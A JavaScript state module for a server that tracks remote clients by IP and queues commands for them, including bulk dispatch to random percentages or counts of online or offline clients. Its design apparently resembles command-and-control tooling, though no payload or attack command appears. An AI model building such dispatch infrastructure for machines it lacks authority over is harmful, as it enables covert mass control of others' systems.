// language: JavaScript, file: src/state.js
import { randomBytes, randomInt } from 'node:crypto';
import { config } from './config.js';

const clients = new Map();

function makeId() {
  return randomBytes(6).toString('hex');
}

export function get(ip) {
  return clients.get(ip);
}

export function upsert(ip, patch) {
  const existing = clients.get(ip);
  const base = existing ?? {
    ip,
    name: '',
    socket: null,
    lastSeen: 0,
    online: false,
    queue: [],
  };
  const next = { ...base, ...patch, ip };
  clients.set(ip, next);
  return next;
}

export function list() {
  return [...clients.values()]
    .map(({ socket, queue, ...rest }) => ({
      ...rest,
      queue: queue.map((e) => ({ id: e.id, cmd: e.cmd })),
    }))
    .sort((a, b) => Number(b.online) - Number(a.online) || a.name.localeCompare(b.name));
}

export function enqueue(ip, cmd) {
  const c = clients.get(ip);
  if (!c) return false;
  c.queue.push({ id: makeId(), cmd });
  return true;
}

function poolByScope(scope) {
  return [...clients.values()].filter((c) =>
    scope === 'all' ? true : scope === 'online' ? c.online : !c.online,
  );
}

// partial Fisher–Yates: pick `k` random entries without full shuffle
function sample(arr, k) {
  if (k >= arr.length) return arr;
  const out = arr.slice();
  for (let i = 0; i < k; i++) {
    const j = i + randomInt(i, out.length);
    [out[i], out[j]] = [out[j], out[i]];
  }
  return out.slice(0, k);
}

export function enqueueTarget(target, cmd) {
  let scope = 'all';
  let mode = 'all';
  let amount = 0;

  if (typeof target === 'string') {
    scope = target;
  } else if (target && typeof target === 'object') {
    scope = target.of === 'online' || target.of === 'offline' ? target.of : 'all';
    if (typeof target.percent === 'number') {
      mode = 'percent';
      amount = Math.max(0, Math.min(100, Math.floor(target.percent)));
    } else if (typeof target.count === 'number') {
      mode = 'count';
      amount = Math.max(0, Math.floor(target.count));
    }
  }

  const pool = poolByScope(scope);

  let chosen = pool;
  if (mode === 'percent') {
    const n = Math.floor((pool.length * amount) / 100);
    chosen = sample(pool, n);
  } else if (mode === 'count') {
    chosen = sample(pool, Math.min(amount, pool.length));
  }

  for (const c of chosen) c.queue.push({ id: makeId(), cmd });
  return { queued: chosen.length, pool: pool.length, scope, mode, amount };
}

export function cancel(ip, id) {
  const c = clients.get(ip);
  if (!c) return false;
  const before = c.queue.length;
  c.queue = c.queue.filter((e) => e.id !== id);
  return c.queue.length !== before;
}

export function drainQueue(ip) {
  const c = clients.get(ip);
  if (!c || c.queue.length === 0) return [];
  const out = c.queue.map((e) => e.cmd);
  c.queue = [];
  return out;
}

export function touch(ip) {
  const c = clients.get(ip);
  if (c) c.lastSeen = Date.now();
}

export function sweep() {
  const now = Date.now();
  for (const [ip, c] of clients) {
    if (c.online && now - c.lastSeen > config.offlineAfterMs) {
      c.online = false;
      if (c.socket) {
        c.socket.destroy();
        c.socket = null;
      }
      if (!config.keepOfflineInList) clients.delete(ip);
    }
  }
}

export function startSweep() {
  setInterval(sweep, config.sweepMs).unref();
}